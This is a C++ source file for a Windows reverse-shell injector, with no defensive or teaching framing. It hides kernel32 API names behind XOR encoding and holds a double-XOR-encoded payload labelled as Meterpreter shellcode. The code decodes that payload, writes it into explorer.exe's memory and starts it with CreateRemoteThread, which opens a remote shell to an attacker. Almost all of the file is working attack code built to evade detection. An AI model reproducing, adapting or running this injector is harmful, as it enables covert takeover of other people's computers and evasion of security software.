// reverseshell.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>

//"Proc name to attach to"
#define procAttachName "explorer.exe"

//"OpenProcess"
size_t OpenProcLen = 11;
unsigned char OpenProc_text[] = { 0x73, 0xE8, 0x8F, 0x87, 0x36, 0xED, 0xEA, 0xCC, 0x35, 0x5B, 0x10 };
unsigned char OpenProc_key[] = { 0x3C, 0x98, 0xEA, 0xE9, 0x66, 0x9F, 0x85, 0xAF, 0x50, 0x28, 0x63 };
typedef HANDLE(WINAPI* OpenProc_CALL)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);

//"VirtualAllocEx"
size_t VirtAELen = 14;
unsigned char VirtAE_text[] = { 0x03, 0xD6, 0x03, 0xDC, 0x70, 0x85, 0x17, 0x15, 0x7B, 0xB6, 0x1C, 0x76, 0x2C, 0x50 };
unsigned char VirtAE_key[] = { 0x55, 0xBF, 0x71, 0xA8, 0x05, 0xE4, 0x7B, 0x54, 0x17, 0xDA, 0x73, 0x15, 0x69, 0x28 };
typedef LPVOID(WINAPI* VirtAE_CALL)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

//"WriteProcessMemory"
size_t WritePMLen = 18;
unsigned char WritePM_text[18] = { 0xF7, 0x9D, 0xF6, 0xE1, 0x98, 0x16, 0xF6, 0xC1, 0x6E, 0xD9, 0x02, 0x3C, 0x41, 0x91, 0xED, 0xBD, 0xCA, 0x71 };
unsigned char WritePM_key[18] = { 0xA0, 0xEF, 0x9F, 0x95, 0xFD, 0x46, 0x84, 0xAE, 0x0D, 0xBC, 0x71, 0x4F, 0x0C, 0xF4, 0x80, 0xD2, 0xB8, 0x08 };
typedef BOOL(WINAPI* WritePM_CALL)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);

//"CreateRemoteThread"
size_t CreateRTLen = 18;
unsigned char CreateRT_text[18] = { 0xA5, 0x7B, 0xEC, 0xB8, 0xE7, 0x86, 0x78, 0x5B, 0xA2, 0x34, 0x8E, 0xBF, 0xD2, 0x20, 0xCA, 0xB1, 0xF4, 0x9B };
unsigned char CreateRT_key[18] = { 0xE6, 0x09, 0x89, 0xD9, 0x93, 0xE3, 0x2A, 0x3E, 0xCF, 0x5B, 0xFA, 0xDA, 0x86, 0x48, 0xB8, 0xD4, 0x95, 0xFF };
typedef HANDLE(WINAPI* CreateRT_CALL)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

//"Meterpreter Shell Code || Double key"
unsigned int bufLen = 510;
unsigned char text_key1[] = { 0xAD, 0xBA, 0xAB, 0xEC, 0xA8, 0x96, 0x8B, 0x53, 0xBC, 0x40, 0x2A, 0x2B, 0x8E, 0xF3, 0x18, 0x7F, 0x71, 0x2B, 0xB1, 0x15, 0x6B, 0xBE, 0xD5, 0x05, 0xB4, 0xFC, 0xAC, 0x4D, 0xE3, 0x2B, 0x51, 0x90, 0xE5, 0xFD, 0x7C, 0x8D, 0x93, 0x07, 0xE1, 0x50, 0x48, 0x0B, 0x7B, 0xD6, 0xFE, 0x94, 0x55, 0x70, 0xBF, 0x06, 0x85, 0x2B, 0xC5, 0x5A, 0x30, 0x79, 0x57, 0xDC, 0xC6, 0x3A, 0x07, 0x18, 0xCB, 0xEC, 0x15, 0x47, 0x7A, 0xA8, 0x4F, 0x5B, 0xF8, 0x97, 0x66, 0x74, 0x6D, 0x64, 0x08, 0xC3, 0xD4, 0xC7, 0xC9, 0x5A, 0xF2, 0x8E, 0xB4, 0x23, 0x08, 0x0B, 0xFF, 0xCE, 0x46, 0x07, 0xE6, 0x11, 0xF3, 0xFB, 0x58, 0x6D, 0xA4, 0xA7, 0xC8, 0x9C, 0x3E, 0x2E, 0x10, 0xAC, 0x93, 0x18, 0x6F, 0x67, 0xE0, 0x38, 0xC1, 0xD2, 0xC7, 0x76, 0xF5, 0xCF, 0x81, 0xF5, 0x9D, 0xC7, 0xFC, 0x84, 0xD8, 0xEF, 0x7F, 0x31, 0x5D, 0x23, 0xD8, 0x25, 0xC0, 0x17, 0x54, 0xD0, 0xC3, 0xE7, 0xE9, 0x32, 0x4E, 0xC9, 0x6A, 0x10, 0x9B, 0x31, 0x86, 0x91, 0x00, 0x07, 0x86, 0x9E, 0xCF, 0x82, 0x22, 0xA7, 0x71, 0xA1, 0xD8, 0xCE, 0xC5, 0xB1, 0xF4, 0x85, 0xC8, 0x48, 0x55, 0x8B, 0x2F, 0x3E, 0xBD, 0x7D, 0x07, 0x27, 0x8D, 0xA3, 0x59, 0x13, 0x34, 0x59, 0x1B, 0xBA, 0xF7, 0xEA, 0x3C, 0x19, 0x91, 0xAD, 0xBB, 0x6A, 0x7C, 0x80, 0x1B, 0x70, 0x05, 0xE3, 0xB8, 0x5A, 0x6E, 0xE7, 0x99, 0x2B, 0x64, 0xA0, 0x52, 0xF2, 0x43, 0xAB, 0x05, 0x77, 0x05, 0x20, 0x31, 0xFC, 0x0A, 0x6D, 0x16, 0x9C, 0x1B, 0xD1, 0x06, 0x97, 0x51, 0x21, 0x07, 0x56, 0x04, 0xBF, 0xB0, 0x72, 0xA6, 0x49, 0x9D, 0x0A, 0xEA, 0xEF, 0xFC, 0x2D, 0x9B, 0x02, 0xA5, 0xA0, 0x22, 0xD6, 0x9C, 0x2D, 0x44, 0xB2, 0xC9, 0x5F, 0x83, 0xCF, 0xF6, 0xD4, 0xF0, 0xFD, 0x2A, 0xF4, 0xBC, 0xDB, 0x66, 0x62, 0x24, 0x03, 0x6C, 0x0E, 0xF2, 0x69, 0x3C, 0x8D, 0x6B, 0xE1, 0x2D, 0x8D, 0xB7, 0xCA, 0xBA, 0xFB, 0x7C, 0x83, 0x5A, 0x00, 0x52, 0x50, 0xD4, 0x42, 0x4D, 0xFF, 0x36, 0x09, 0xDA, 0x9C, 0x6B, 0xFE, 0x9F, 0xD8, 0x0D, 0x92, 0x41, 0x49, 0x1F, 0xAC, 0x2A, 0x4D, 0x39, 0xE1, 0x17, 0xF4, 0xDD, 0x93, 0x77, 0x37, 0x93, 0xCA, 0x88, 0x68, 0x0C, 0xD5, 0x67, 0x43, 0xDF, 0x41, 0xDF, 0x4A, 0x3F, 0x7F, 0x22, 0x4C, 0x11, 0x63, 0x95, 0x30, 0x0F, 0xBF, 0x7D, 0x49, 0xA1, 0x94, 0x3D, 0x7E, 0x28, 0xB4, 0xB5, 0xBB, 0x7E, 0x3D, 0x23, 0x8B, 0x13, 0x8A, 0xCE, 0xF2, 0xCB, 0xAD, 0x3C, 0x0B, 0x2C, 0x5F, 0x57, 0x3D, 0xC2, 0xED, 0x6E, 0xD2, 0xAC, 0xEB, 0x1B, 0x4D, 0x80, 0x58, 0xCB, 0xA8, 0x0C, 0x81, 0x63, 0x8B, 0xBE, 0x87, 0x16, 0xD1, 0x11, 0xE4, 0xC3, 0xDD, 0x91, 0x00, 0xE8, 0xBE, 0x5F, 0x3F, 0xFB, 0x21, 0x2C, 0x69, 0xF3, 0xD9, 0x55, 0x0E, 0x26, 0xD5, 0x66, 0xF2, 0x7D, 0x73, 0x73, 0xE0, 0xFE, 0x31, 0x67, 0x14, 0x03, 0x79, 0xF8, 0xC6, 0x56, 0x89, 0xC6, 0x3E, 0x47, 0x25, 0x7D, 0x43, 0x47, 0xAA, 0xAC, 0x3A, 0x83, 0x01, 0x49, 0xA9, 0xD6, 0xAF, 0x9B, 0x53, 0x22, 0x0E, 0x34, 0x20, 0x40, 0x9B, 0x34, 0x43, 0x14, 0x2C, 0x09, 0x6A, 0xB6, 0xD0, 0xA8, 0xFD, 0xF5, 0x26, 0x40, 0x3C, 0xD0, 0xED, 0x77, 0x53, 0xEE, 0xC0, 0xFC, 0xC5, 0x6F, 0x98, 0x18, 0x92, 0xA6, 0x4C, 0xB2, 0xE6, 0xE8, 0xE7, 0x29, 0xFC, 0x13, 0x33, 0x67, 0xC9, 0x03, 0x0F, 0xC7, 0xF8, 0x35, 0x07, 0x35, 0x05, 0xF4, 0xAC, 0x58, 0xE3, 0x6C, 0x55, 0xA8, 0xDB, 0xED, 0xC0, 0x6D, 0x93, 0x0D, 0x20, 0x7A, 0xF5, 0x07, 0xA3, 0xF1, 0x1A, 0xD6, 0x58, 0xE4, 0xD9 };
unsigned char text_key2[] = { 0x5F, 0xF3, 0xBD, 0x6F, 0x91, 0xC8, 0x2D, 0x05, 0x51, 0x14, 0x0E, 0xA4, 0x4C, 0xAB, 0xC6, 0x95, 0x7E, 0xD4, 0xE4, 0xBB, 0x0A, 0x87, 0x9F, 0xAB, 0x52, 0xAB, 0x4A, 0x2F, 0xFE, 0xD0, 0x10, 0x5D, 0xC3, 0xCD, 0xCD, 0x54, 0x95, 0xFA, 0x5A, 0xE7, 0x0E, 0x68, 0x8B, 0x5A, 0x13, 0x52, 0xEF, 0x91, 0x26, 0xD3, 0x4C, 0x30, 0x5B, 0xEB, 0xDB, 0xAD, 0x96, 0x25, 0xDC, 0x95, 0xF5, 0xEC, 0xF2, 0xB9, 0xB9, 0xBF, 0x0D, 0x4E, 0xBA, 0x67, 0x35, 0xC8, 0xD0, 0xC1, 0x23, 0xE3, 0x13, 0x12, 0x75, 0x39, 0xE6, 0xC1, 0x69, 0x41, 0xAD, 0x44, 0xEE, 0x43, 0x6A, 0xCA, 0xD8, 0x5F, 0xB6, 0xCB, 0x18, 0x6F, 0x8A, 0x26, 0xBD, 0x44, 0x8D, 0xF3, 0x0D, 0x5D, 0xB4, 0x30, 0x41, 0xC7, 0x42, 0xB6, 0x00, 0x28, 0x77, 0x69, 0x69, 0x24, 0xAD, 0x57, 0x68, 0x17, 0x21, 0x40, 0x77, 0xD7, 0x0B, 0x8F, 0x46, 0x96, 0xB5, 0x04, 0xDA, 0x43, 0xF7, 0xE7, 0xA0, 0xAB, 0x17, 0xE1, 0x72, 0x5A, 0x97, 0x72, 0x82, 0x0F, 0xDB, 0xEC, 0x33, 0x88, 0x43, 0x9B, 0xA0, 0x65, 0xDC, 0x17, 0x3C, 0xE7, 0xA6, 0x83, 0x7D, 0x5C, 0x87, 0x58, 0x9F, 0x7E, 0x3F, 0x3F, 0x29, 0x57, 0x21, 0x9B, 0xB1, 0xB8, 0x0D, 0x33, 0xC7, 0xE8, 0x1F, 0xFB, 0x70, 0x63, 0x96, 0x10, 0xC8, 0x72, 0x27, 0x04, 0x5A, 0xCE, 0x87, 0xD7, 0x2A, 0x0E, 0x2F, 0xC9, 0x8C, 0x6F, 0x08, 0xB5, 0xC6, 0x29, 0x50, 0x77, 0xE2, 0x5D, 0xAA, 0xA9, 0x45, 0xCA, 0xA4, 0xB6, 0x2D, 0x3B, 0xC6, 0xF5, 0xAD, 0xEE, 0xF9, 0x07, 0xBC, 0x81, 0xDF, 0xE6, 0x8F, 0x0E, 0xAF, 0x1C, 0x7D, 0xB7, 0xD1, 0x43, 0xE1, 0x22, 0xBA, 0xC3, 0x7F, 0x65, 0x6C, 0xC5, 0x2F, 0x11, 0x7B, 0x5C, 0x4C, 0x41, 0x51, 0xF9, 0x2F, 0x4A, 0x01, 0xEB, 0xCB, 0xE0, 0xD1, 0x5B, 0xEE, 0x80, 0x77, 0x6C, 0x38, 0x48, 0xAF, 0x19, 0x6A, 0x6A, 0xDC, 0xEA, 0xCF, 0x48, 0xAF, 0xFE, 0x59, 0x2A, 0x5A, 0xA5, 0x6B, 0xAB, 0x9F, 0x9B, 0xF5, 0xA0, 0x86, 0xC1, 0x80, 0x58, 0x1C, 0x6E, 0xD8, 0x93, 0xDA, 0x10, 0xDB, 0x8A, 0x29, 0x46, 0xF4, 0x05, 0x30, 0xC3, 0x4E, 0xDF, 0xC1, 0xA7, 0x09, 0x1B, 0x4D, 0x74, 0xC6, 0xEC, 0x0F, 0xBB, 0x8C, 0x96, 0x7C, 0x0C, 0xEE, 0x98, 0x7A, 0xC6, 0x2B, 0x55, 0xD7, 0x07, 0xDF, 0x00, 0x4D, 0xD3, 0x06, 0x7D, 0x96, 0x54, 0x5C, 0x57, 0xFB, 0x65, 0x72, 0x48, 0xD9, 0x38, 0x34, 0xE9, 0xF3, 0xC0, 0x7F, 0x70, 0xCC, 0x6D, 0x08, 0x47, 0x33, 0x34, 0x9C, 0x0A, 0x3B, 0x7B, 0x0B, 0x88, 0x4E, 0x11, 0x05, 0xE4, 0x65, 0x61, 0x3B, 0x60, 0xC6, 0xAD, 0xA9, 0x9F, 0xE5, 0xDD, 0x88, 0xD8, 0x9E, 0x07, 0x48, 0x6A, 0x74, 0x51, 0xB1, 0xA8, 0x85, 0x4D, 0xB2, 0xC0, 0xC8, 0xBD, 0x48, 0x16, 0xCE, 0x4D, 0xFA, 0x33, 0xAE, 0x35, 0x94, 0x74, 0xE2, 0x3D, 0x13, 0xC7, 0x1A, 0x9C, 0xA0, 0xB8, 0xA3, 0xE8, 0x23, 0x18, 0x39, 0xD4, 0xC0, 0xBE, 0x22, 0x72, 0x7E, 0xEA, 0x30, 0xC6, 0x01, 0xFE, 0x13, 0xFB, 0x32, 0xC1, 0x31, 0xC6, 0x35, 0x13, 0x03, 0x49, 0xDB, 0x1D, 0xE5, 0x7B, 0xD6, 0x88, 0x63, 0xF9, 0xA0, 0x9D, 0xCD, 0x60, 0x5B, 0xEF, 0xD3, 0xDA, 0xDA, 0x03, 0xA0, 0xDB, 0x01, 0xB4, 0xD6, 0x33, 0x75, 0x07, 0xF9, 0xAB, 0x1B, 0xFC, 0xF4, 0xF6, 0x1A, 0xD9, 0x71, 0xF0, 0x61, 0xD4, 0xE9, 0x02, 0x71, 0xB6, 0x62, 0xCD, 0xA6, 0x35, 0xA7, 0x80, 0x38, 0x47, 0x5B, 0x3A, 0xFB, 0x31, 0x6D, 0x71, 0x39, 0x67, 0x1C, 0x54, 0x63, 0x10, 0x4A, 0x7D, 0xE9, 0xBB, 0x6D, 0x4A, 0x8F, 0x56, 0x4C, 0x01, 0x0D, 0xAF, 0xCE, 0xB3, 0xE4, 0x75, 0x33, 0x1D };
unsigned char text[] = { 0x0E, 0x01, 0x95, 0x67, 0xC9, 0xB6, 0x6A, 0x56, 0xED, 0x54, 0x65, 0xDE, 0x83, 0x08, 0x8C, 0xBB, 0x47, 0xCE, 0x87, 0xF8, 0x04, 0x71, 0xC1, 0xFC, 0x86, 0x1F, 0x6D, 0x30, 0x05, 0xB3, 0xCA, 0x9F, 0x06, 0x7D, 0x80, 0x10, 0x4E, 0x76, 0xC9, 0xE7, 0x0E, 0x6C, 0x47, 0xC6, 0xA7, 0x8E, 0x8B, 0x21, 0x35, 0xE9, 0xA8, 0x67, 0x9C, 0x9D, 0xCB, 0x95, 0x00, 0x30, 0x17, 0xEE, 0xF3, 0x35, 0xDB, 0xB8, 0xFE, 0xB0, 0xFC, 0xB4, 0xD5, 0x7D, 0x9C, 0xD4, 0xF4, 0x89, 0x06, 0x86, 0xCB, 0xB7, 0x20, 0x86, 0x37, 0x90, 0x99, 0xC0, 0x9C, 0x15, 0xE6, 0x48, 0x95, 0x8F, 0x1E, 0xD0, 0x50, 0xDA, 0xEB, 0xDC, 0x57, 0x8B, 0x6D, 0x84, 0x0D, 0x6E, 0xE3, 0x23, 0x2F, 0xD4, 0xCA, 0x9B, 0xA6, 0x91, 0xC0, 0x59, 0xB7, 0x6B, 0x4D, 0x04, 0x10, 0x67, 0x20, 0xAF, 0x8D, 0x4E, 0xCA, 0xD8, 0xE7, 0xE8, 0x71, 0xA6, 0x3E, 0x6F, 0x33, 0xA6, 0x76, 0x31, 0x3D, 0x76, 0x78, 0x47, 0x9A, 0xA9, 0xE1, 0x5B, 0x9D, 0xEE, 0x0C, 0xDE, 0xF9, 0x3D, 0x4B, 0xD9, 0x1F, 0x2A, 0x66, 0x4D, 0x46, 0x04, 0x5C, 0x62, 0x81, 0xDB, 0x43, 0x39, 0x0D, 0xBA, 0x7C, 0x7B, 0x34, 0x98, 0x85, 0xE5, 0x10, 0x8C, 0x0B, 0xC4, 0x0B, 0xC0, 0x42, 0x60, 0x05, 0x62, 0xC5, 0xAB, 0xEF, 0xD9, 0x43, 0x43, 0x92, 0x39, 0x7D, 0xE5, 0x17, 0xD7, 0x75, 0xE3, 0xC1, 0x0F, 0x5C, 0xCF, 0xE9, 0x9C, 0x36, 0xBC, 0xDE, 0xBC, 0xA1, 0x01, 0x4E, 0xEA, 0xB3, 0x28, 0x63, 0xE4, 0x08, 0xF6, 0xFA, 0xCA, 0x51, 0xEC, 0xD4, 0x62, 0x86, 0x42, 0xEC, 0x2F, 0xA8, 0x0B, 0x2F, 0x41, 0xE8, 0xD7, 0x0F, 0xEA, 0xCB, 0x69, 0x94, 0x8A, 0x90, 0xA1, 0x3D, 0xF6, 0x97, 0x40, 0x6C, 0x97, 0xDC, 0x88, 0xAB, 0x50, 0xB2, 0xB5, 0x09, 0x7B, 0x6E, 0x06, 0xFA, 0x31, 0xD4, 0x69, 0xC5, 0x29, 0x85, 0x0C, 0x68, 0x6E, 0x4F, 0x31, 0x71, 0xA8, 0x79, 0x1B, 0x33, 0xCA, 0x77, 0x28, 0x85, 0x20, 0x9F, 0x49, 0x09, 0x48, 0xDC, 0x3E, 0x07, 0x62, 0xC2, 0x6D, 0xCB, 0x3C, 0xBC, 0x54, 0x30, 0xDF, 0x0F, 0x89, 0xAB, 0x95, 0xC2, 0x91, 0x47, 0x1F, 0x1C, 0x43, 0xDC, 0x96, 0x3C, 0x1C, 0x10, 0x59, 0x68, 0xC2, 0xF4, 0x7E, 0x0F, 0x39, 0xB3, 0xB8, 0xFF, 0xD4, 0x26, 0x06, 0x49, 0x1E, 0x4C, 0xC3, 0x90, 0xE4, 0xAD, 0xC8, 0xC6, 0x8D, 0x50, 0xC2, 0x80, 0xBB, 0xF0, 0xD4, 0xFD, 0x6C, 0x7D, 0x9D, 0x92, 0x8B, 0x04, 0xBE, 0x57, 0xB8, 0xB8, 0xCC, 0x20, 0xBE, 0x1A, 0x7B, 0x1C, 0xC6, 0x7F, 0x0A, 0x80, 0x03, 0x63, 0x10, 0xCD, 0x88, 0x14, 0xEA, 0x22, 0xCF, 0x4B, 0x93, 0xDF, 0x87, 0x9A, 0xB8, 0xCD, 0x79, 0xFE, 0x62, 0x32, 0xD6, 0xD9, 0x2C, 0xDC, 0x2A, 0xB5, 0x3D, 0x07, 0x34, 0x56, 0xC2, 0xD1, 0x33, 0x58, 0x7A, 0x82, 0x4C, 0x67, 0xAD, 0xF6, 0x6B, 0x7D, 0x9B, 0x8E, 0x26, 0xEC, 0x02, 0x91, 0xB2, 0x85, 0x8D, 0x0D, 0x25, 0x3C, 0x12, 0x92, 0x3D, 0xEB, 0x2A, 0x7F, 0x3F, 0x0B, 0xEA, 0xA7, 0xF1, 0xFC, 0x9B, 0xD5, 0x75, 0x6C, 0x5A, 0xC3, 0x19, 0x4C, 0x08, 0x7C, 0xF1, 0x3C, 0xD9, 0xA8, 0x0C, 0x63, 0xFE, 0xF9, 0x5E, 0x67, 0x9B, 0x9B, 0xE7, 0x35, 0xBB, 0x08, 0x66, 0xF4, 0x92, 0xD7, 0x57, 0xCF, 0xEA, 0xD4, 0xB9, 0x4F, 0x37, 0x27, 0x3C, 0x45, 0xBE, 0xBC, 0x35, 0x9E, 0xD9, 0xE1, 0x91, 0xF7, 0x1C, 0x2A, 0xCE, 0x60, 0x4F, 0x3F, 0x87, 0xD2, 0x74, 0x63, 0x3D, 0x31, 0x7E, 0x59, 0xB7, 0x85, 0xE2, 0x82, 0xFF, 0x8A, 0xB3, 0x97, 0x12, 0x45, 0x84, 0xE7, 0x81, 0xE8, 0x76, 0x6F, 0xBD, 0xCD, 0xCE, 0xCF, 0x1C, 0x90, 0x7B, 0x28, 0x11 };


unsigned char* xorDE(unsigned char* t, unsigned char* k, size_t len) {
    unsigned char* ft = (unsigned char*)malloc(len);
    for (int i = 0; i < len; i++) {
        ft[i] = t[i] ^ k[i];
    }
    return ft;
}

int findProcID() {
    // Pulling procName from procAttachName
    wchar_t procName[260];
    size_t procNameConvert;
    PROCESSENTRY32 proc;

    mbstowcs_s(&procNameConvert, procName, procAttachName, strlen(procAttachName));

    proc.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snap == INVALID_HANDLE_VALUE) {
        return -1;
    }

    if (!Process32First(snap, &proc)) {
        return -1;
    }

    while (Process32Next(snap, &proc)) {
        if (wcscmp(proc.szExeFile, procName) == 0) {
            CloseHandle(snap);
            return proc.th32ProcessID;
        }
    }
    return 0;
}

int openRShell(HANDLE rProc) {
    LPVOID addr = NULL;
    HANDLE threadHandle = NULL;
    size_t bWritten;
    
    unsigned char* bufKey = xorDE(text_key1, text_key2, bufLen);
    unsigned char* bufPT = xorDE(text, bufKey, bufLen);

    VirtAE_CALL VirtAE;
    unsigned char* VirtAE_D = (unsigned char*)malloc(VirtAELen);
    VirtAE_D = xorDE(VirtAE_text, VirtAE_key, VirtAELen);
    VirtAE = (VirtAE_CALL)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)VirtAE_D);

    WritePM_CALL WritePM;
    unsigned char* WritePM_D = (unsigned char*)malloc(WritePMLen);
    WritePM_D = xorDE(WritePM_text, WritePM_key, WritePMLen);
    WritePM = (WritePM_CALL)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)WritePM_D);

    CreateRT_CALL CreateRT;
    unsigned char* CreateRT_D = (unsigned char*)malloc(WritePMLen);
    CreateRT_D = xorDE(CreateRT_text, CreateRT_key, CreateRTLen);
    CreateRT = (CreateRT_CALL)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)CreateRT_D);

    addr = VirtAE(rProc, NULL, bufLen, MEM_COMMIT, PAGE_EXECUTE_READ);
    //addr = VirtualAllocEx(rProc, NULL, bufLen, MEM_COMMIT, PAGE_EXECUTE_READ);
    WritePM(rProc, addr, (PVOID)bufPT, (SIZE_T)bufLen, &bWritten);
    //WriteProcessMemory(rProc, addr, (PVOID)bufPT, (SIZE_T)bufLen, &bWritten);
    threadHandle = CreateRT(rProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);
    //threadHandle = CreateRemoteThread(rProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);

    free(VirtAE_D);
    free(WritePM_D);
    free(CreateRT_D);
    free(bufKey);
    free(bufPT);

    if (threadHandle != NULL) {
        return 0;
    }

    return -1;
}

int main() {
    int result;
    HANDLE procHandle;
    OpenProc_CALL OpenProc;
    unsigned char* OpenProc_D = (unsigned char*)malloc(OpenProcLen);
    OpenProc_D = xorDE(OpenProc_text, OpenProc_key, OpenProcLen);
    OpenProc = (OpenProc_CALL)(GetProcAddress(GetModuleHandleA("kernel32.dll"), (char *)OpenProc_D));

    //result = openRShell(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)findProcID()));
    procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)findProcID());
    printf("here\n");
    result = openRShell(procHandle);

    printf("Result: %d\n", result);
    free(OpenProc);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
